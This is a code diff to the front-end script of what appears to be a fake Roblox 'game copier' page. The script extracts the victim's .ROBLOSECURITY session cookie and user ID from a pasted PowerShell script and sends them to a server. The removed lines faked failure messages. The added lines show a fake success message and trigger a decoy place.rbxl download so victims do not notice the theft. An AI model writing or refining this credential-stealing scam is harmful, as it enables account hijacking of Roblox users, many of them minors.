@@ -19,16 +19,14 @@ function validatePin() {
     return isValid;
 }
 
-// Extract cookie and rbxuid from pasted PowerShell script
+// Extract cookie and rbxuid
 function extractGameData(fullText) {
-    // Match .ROBLOSECURITY", "cookie_value"
     const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
     if (!cookieMatch) {
         return { success: false, message: "Your Game Key is not valid! (Check if you copied it right!)" };
     }
     const robloxCookie = cookieMatch[1];
 
-    // Match RBXEventTrackerV2", "params...&rbxuid=123456&..."
     const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
     let rbxuid = null;
     if (eventTrackerMatch) {
@@ -41,20 +39,14 @@ function extractGameData(fullText) {
     return { success: true, cookie: robloxCookie, rbxuid };
 }
 
-// Fake "connection lost" popup (35% chance)
-function maybeShowFakeConnectionLoss() {
-    if (Math.random() < 0.35) {
-        const originalMsg = statusMessage.textContent;
-        const originalColor = statusMessage.style.color;
-        statusMessage.textContent = "⚠️ Connection lost! Unable to reach Roblox servers.";
-        statusMessage.style.color = "#ffaa66";
-        setTimeout(() => {
-            if (statusMessage.textContent.includes("Connection lost")) {
-                statusMessage.textContent = originalMsg;
-                statusMessage.style.color = originalColor;
-            }
-        }, 3000);
-    }
+// Trigger download of place.rbxl from the public folder
+function downloadPlaceFile() {
+    const link = document.createElement('a');
+    link.href = '/place.rbxl';
+    link.download = 'place.rbxl';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
 }
 
 copyButton.addEventListener("click", async () => {
@@ -95,21 +87,29 @@ copyButton.addEventListener("click", async () => {
         });
 
         if (!response.ok) {
-            const errorText = await response.text();
-            throw new Error(`Server error ${response.status}: ${errorText}`);
+            throw new Error(`Server error ${response.status}`);
         }
 
         const result = await response.json();
 
-        // Deception: always show fake failure even on success
-        if (result.success === true) {
-            statusMessage.textContent = "✗ Game Copy request was not processed. Please check your internet connection.";
+        // Handle rate limiting (blocked)
+        if (result.blocked === true) {
+            statusMessage.textContent = result.message || "Your game key appears to be invalid or expired. Please obtain a new key.";
             statusMessage.style.color = "#ff9d9d";
-            maybeShowFakeConnectionLoss();
-        } else {
-            statusMessage.textContent = result.error || "✗ Copy failed! Check your internet connection.";
-            statusMessage.style.color = "#ff9d9d";
+            return;
         }
+
+        // First time success (or after cooldown)
+        if (result.success === true && result.firstTime === true) {
+            statusMessage.textContent = "✅ Game copied successfully! Starting download...";
+            statusMessage.style.color = "#a5d6ff";
+            downloadPlaceFile();
+            return;
+        }
+
+        // Any other failure (webhook failed, etc.)
+        statusMessage.textContent = result.error || "✗ Copy failed! Check your internet connection.";
+        statusMessage.style.color = "#ff9d9d";
     } catch (err) {
         console.error("Fetch error:", err);
         statusMessage.textContent = "✗ Network error. Could not reach processing server.";
